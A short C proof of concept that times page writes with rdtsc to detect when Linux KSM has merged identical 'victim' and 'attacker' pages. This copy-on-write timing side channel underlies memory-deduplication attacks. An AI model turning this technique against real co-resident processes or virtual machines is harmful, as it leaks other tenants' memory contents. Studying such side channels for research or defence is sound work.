#include <x86intrin.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

// write a null byte to addr
void poke(char *addr) { *addr = '\0'; }

// return the difference in the processor's timestamp before and after poke
uint64_t time_poke(char *addr) {
    uint64_t start = __rdtsc();
    poke(addr);
    uint64_t end = __rdtsc();
    return end-start;
}

// allocate a single read/write anon/private page
void *alloc_page() {
    return mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
}

// read a byte from addr
void maccess(char *addr) { volatile char c = *addr; }

// time maccess using the processor timestamp
uint64_t time_access(char *addr) {
    uint64_t start = __rdtsc();
    maccess(addr);
    uint64_t end = __rdtsc();
    return end-start;
}

int main() {
    // allocate victim and attacker pages
    void *victim = alloc_page();
    void *attacker = alloc_page();

    // mark both pages as mergable
    madvise(victim, 0x1000, MADV_MERGEABLE);
    madvise(attacker, 0x1000, MADV_MERGEABLE);

    // write something unique to both pages so they aren't merged with
    // other pages, this also faults them to be sure they are allocated
    *(uint64_t *)victim = 0x1337;
    *(uint64_t *)attacker = 0x1337;

    printf("sleeping to wait for merge...\n");

    // can take much longer than this if KSM is being heavily used
    // i.e. if a VM that uses KSM is running
    sleep(10);

    printf("finished sleeping... checking access times\n");
    printf("read  : %ld cycles\n", time_access(attacker));
    printf("write : %ld cycles\n", time_poke(attacker));
    printf("write : %ld cycles\n", time_poke(attacker));

    return 0;
}
